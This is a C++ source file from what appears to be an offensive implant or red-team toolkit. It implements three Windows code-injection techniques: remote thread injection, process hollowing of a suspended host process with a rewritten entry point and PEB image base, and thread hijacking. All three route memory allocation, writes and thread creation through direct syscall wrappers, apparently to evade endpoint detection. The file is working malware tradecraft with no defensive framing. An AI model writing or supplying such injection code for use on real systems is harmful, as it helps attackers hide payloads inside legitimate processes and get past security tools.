#include "Inject.h"
#include "Syscalls.h"
#include "NtTypes.h"

#include <windows.h>
#include <tlhelp32.h>

#include <cstring>
#include <string>
#include <vector>

namespace inject {

namespace {

bool is_pe(const std::uint8_t* p, std::size_t n) {
    if (n < sizeof(IMAGE_DOS_HEADER)) return false;
    auto dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(p);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;
    if (static_cast<std::size_t>(dos->e_lfanew) + sizeof(IMAGE_NT_HEADERS) > n) return false;
    auto nt = reinterpret_cast<const IMAGE_NT_HEADERS*>(p + dos->e_lfanew);
    return nt->Signature == IMAGE_NT_SIGNATURE &&
           nt->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC;
}

} // namespace

std::string remote_map(std::uint32_t pid, const std::uint8_t* payload, std::size_t len) {
    HANDLE h = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
                           PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, pid);
    if (!h) return "error: OpenProcess " + std::to_string(GetLastError());

    void* mem = nullptr;
    std::size_t sz = len;
    NTSTATUS s = syscalls::ScAllocVm(h, &mem, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (s < 0) { CloseHandle(h); return "error: alloc"; }

    std::size_t wn = 0;
    s = syscalls::ScWriteVm(h, mem, const_cast<void*>(static_cast<const void*>(payload)), len, &wn);
    if (s < 0) { CloseHandle(h); return "error: write"; }

    std::uint32_t old = 0;
    s = syscalls::ScProtectVm(h, &mem, &sz, PAGE_EXECUTE_READ, &old);
    if (s < 0) { CloseHandle(h); return "error: protect"; }

    HANDLE th = nullptr;
    s = syscalls::ScCreateThreadEx(&th, GENERIC_ALL, nullptr, h, mem, nullptr, FALSE, 0, 0, 0, nullptr);
    if (s < 0 || !th) { CloseHandle(h); return "error: thread"; }
    CloseHandle(th); CloseHandle(h);
    return "ok: injected thread into " + std::to_string(pid);
}

// No full reloc engine — prefer /FIXED or matching preferred base.
std::string hollowing(const std::uint8_t* payload, std::size_t len, const wchar_t* host_path) {
    if (!payload || !len || !host_path) return "error: bad args";
    if (!is_pe(payload, len)) return "error: payload is not a PE64";

    auto dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(payload);
    auto nt = reinterpret_cast<const IMAGE_NT_HEADERS*>(payload + dos->e_lfanew);
    const auto& opt = nt->OptionalHeader;
    std::size_t image_size = opt.SizeOfImage;
    std::uintptr_t preferred = opt.ImageBase;
    std::uintptr_t entry_rva = opt.AddressOfEntryPoint;

    STARTUPINFOW si{};
    PROCESS_INFORMATION pi{};
    si.cb = sizeof(si);
    std::wstring cmd(host_path);
    if (!CreateProcessW(nullptr, cmd.data(), nullptr, nullptr, FALSE,
                        CREATE_SUSPENDED | CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        return "error: CreateProcess " + std::to_string(GetLastError());
    }

    void* remote = reinterpret_cast<void*>(preferred);
    std::size_t sz = image_size;
    NTSTATUS s = syscalls::ScAllocVm(pi.hProcess, &remote, 0, &sz,
                                     MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (s < 0 || !remote) {
        // Fallback: any address (relocs may be required).
        remote = nullptr;
        sz = image_size;
        s = syscalls::ScAllocVm(pi.hProcess, &remote, 0, &sz,
                                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    }
    if (s < 0 || !remote) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        return "error: remote alloc";
    }

    std::vector<std::uint8_t> local(image_size, 0);
    std::memcpy(local.data(), payload, opt.SizeOfHeaders);
    auto sect = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        if (!sect[i].SizeOfRawData) continue;
        if (static_cast<std::size_t>(sect[i].PointerToRawData) + sect[i].SizeOfRawData > len)
            continue;
        if (static_cast<std::size_t>(sect[i].VirtualAddress) + sect[i].SizeOfRawData > image_size)
            continue;
        std::memcpy(local.data() + sect[i].VirtualAddress,
                    payload + sect[i].PointerToRawData,
                    sect[i].SizeOfRawData);
    }

    auto local_nt = reinterpret_cast<IMAGE_NT_HEADERS*>(local.data() + dos->e_lfanew);
    local_nt->OptionalHeader.ImageBase = reinterpret_cast<std::uintptr_t>(remote);

    std::size_t wn = 0;
    s = syscalls::ScWriteVm(pi.hProcess, remote, local.data(), image_size, &wn);
    if (s < 0) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        return "error: write image";
    }

    std::uint32_t old = 0;
    void* prot_base = remote;
    std::size_t prot_sz = image_size;
    syscalls::ScProtectVm(pi.hProcess, &prot_base, &prot_sz, PAGE_EXECUTE_READWRITE, &old);

    CONTEXT ctx{};
    ctx.ContextFlags = CONTEXT_FULL;
    if (syscalls::ScGetCtx(pi.hThread, &ctx) < 0) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        return "error: GetContext";
    }
    ctx.Rip = reinterpret_cast<std::uintptr_t>(remote) + entry_rva;
    // PEB ImageBaseAddress is at PEB+0x10 on x64; update if we can read PEB from Rdx (x64 CreateProcess).
    // Rdx often holds PEB on suspended new process entry.
    if (ctx.Rdx) {
        std::uintptr_t new_base = reinterpret_cast<std::uintptr_t>(remote);
        std::size_t w2 = 0;
        syscalls::ScWriteVm(pi.hProcess,
                            reinterpret_cast<void*>(ctx.Rdx + 0x10),
                            &new_base, sizeof(new_base), &w2);
    }
    if (syscalls::ScSetCtx(pi.hThread, &ctx) < 0) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        return "error: SetContext";
    }

    std::uint32_t sc = 0;
    syscalls::ScResume(pi.hThread, &sc);
    CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
    return "ok: hollowed pid " + std::to_string(pi.dwProcessId) +
           " entry 0x" + std::to_string(ctx.Rip);
}

std::string hijack_thread(std::uint32_t pid, const std::uint8_t* payload, std::size_t len) {
    if (!payload || !len) return "error: bad payload";

    HANDLE h = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
                           PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ |
                           PROCESS_SUSPEND_RESUME, FALSE, pid);
    if (!h) return "error: OpenProcess " + std::to_string(GetLastError());

    void* mem = nullptr;
    std::size_t sz = len;
    NTSTATUS s = syscalls::ScAllocVm(h, &mem, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (s < 0) { CloseHandle(h); return "error: alloc"; }
    std::size_t wn = 0;
    s = syscalls::ScWriteVm(h, mem, const_cast<void*>(static_cast<const void*>(payload)), len, &wn);
    if (s < 0) { CloseHandle(h); return "error: write"; }
    std::uint32_t old = 0;
    syscalls::ScProtectVm(h, &mem, &sz, PAGE_EXECUTE_READ, &old);

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE) { CloseHandle(h); return "error: snapshot"; }

    THREADENTRY32 te{};
    te.dwSize = sizeof(te);
    DWORD tid = 0;
    if (Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) { tid = te.th32ThreadID; break; }
        } while (Thread32Next(snap, &te));
    }
    CloseHandle(snap);
    if (!tid) { CloseHandle(h); return "error: no thread"; }

    HANDLE th = OpenThread(THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT,
                           FALSE, tid);
    if (!th) { CloseHandle(h); return "error: OpenThread " + std::to_string(GetLastError()); }

    if (SuspendThread(th) == static_cast<DWORD>(-1)) {
        CloseHandle(th); CloseHandle(h);
        return "error: SuspendThread";
    }

    CONTEXT ctx{};
    ctx.ContextFlags = CONTEXT_FULL;
    if (syscalls::ScGetCtx(th, &ctx) < 0) {
        ResumeThread(th);
        CloseHandle(th); CloseHandle(h);
        return "error: GetContext";
    }
    ctx.Rip = reinterpret_cast<std::uintptr_t>(mem);
    if (syscalls::ScSetCtx(th, &ctx) < 0) {
        ResumeThread(th);
        CloseHandle(th); CloseHandle(h);
        return "error: SetContext";
    }
    ResumeThread(th);
    CloseHandle(th); CloseHandle(h);
    return "ok: hijacked tid " + std::to_string(tid) + " in pid " + std::to_string(pid);
}

} // namespace inject
